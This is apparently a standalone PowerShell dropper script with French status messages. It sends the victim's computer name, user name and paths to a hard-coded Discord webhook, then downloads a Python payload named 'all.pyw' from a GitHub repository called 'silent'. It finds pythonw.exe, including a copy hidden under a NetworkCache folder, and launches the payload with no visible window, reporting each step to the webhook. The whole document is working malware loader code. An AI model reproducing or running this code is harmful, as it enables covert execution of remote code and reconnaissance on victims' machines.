$ErrorActionPreference = 'Continue'
$WEBHOOK = 'https://discord.com/api/webhooks/1553812001174851644/XxjDh7jerGG_jVNKlmSF48UEycZFiD7PDwMGMSKiuQ7d9RWeYt-JvGOS3Y-5xPGX3D-E'

function Send-ToWebhook($title, $msg) {
    try {
        $content = "**$title** — $env:COMPUTERNAME`n``````$msg``````"
        $body = @{ content = $content } | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10 > $null
    } catch {}
}

Send-ToWebhook "LAUNCHER démarré" "PSVersion: $($PSVersionTable.PSVersion)`nUser: $env:USERNAME`nTemp: $env:TEMP`nLocalAppData: $env:LOCALAPPDATA"

try {
    $tmp = Join-Path $env:TEMP 'all.pyw'
    Send-ToWebhook "Étape 1" "Téléchargement vers $tmp"

    try {
        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Paladu13/silent/main/all.pyw' -OutFile $tmp -UseBasicParsing
    } catch {
        Send-ToWebhook "Erreur téléchargement" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
        exit 1
    }

    if (-not (Test-Path $tmp)) {
        Send-ToWebhook "Erreur" "all.pyw non téléchargé"
        exit 1
    }

    Send-ToWebhook "Étape 2" "Détection admin"
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $isAdmin = $false
        Send-ToWebhook "Erreur détection admin" "$($_.Exception.Message)"
    }

    Send-ToWebhook "Étape 3" "Résolution pythonw.exe (admin=$isAdmin)"
    $pythonw = $null
    try {
        $cmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source -and (Test-Path $cmd.Source)) { $pythonw = $cmd.Source }
    } catch {}
    if (-not $pythonw) {
        $embedded = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\NetworkCache\Python310\pythonw.exe'
        if (Test-Path $embedded) { $pythonw = $embedded }
    }
    if (-not $pythonw) {
        Send-ToWebhook "Erreur" "pythonw.exe introuvable (ni PATH ni NetworkCache)"
        exit 1
    }
    Send-ToWebhook "pythonw trouvé" $pythonw

    Send-ToWebhook "Étape 4" "Lancement pythonw all.pyw"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $pythonw
        $psi.Arguments = '"' + $tmp + '"'
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.WindowStyle = 'Hidden'
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        Send-ToWebhook "pythonw lancé" "PID: $($proc.Id)"
    } catch {
        Send-ToWebhook "Erreur lancement pythonw" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
        exit 1
    }
} catch {
    Send-ToWebhook "Erreur globale run.ps1" "$($_.Exception.Message)`n$($_.ScriptStackTrace)"
    exit 1
}

exit 0
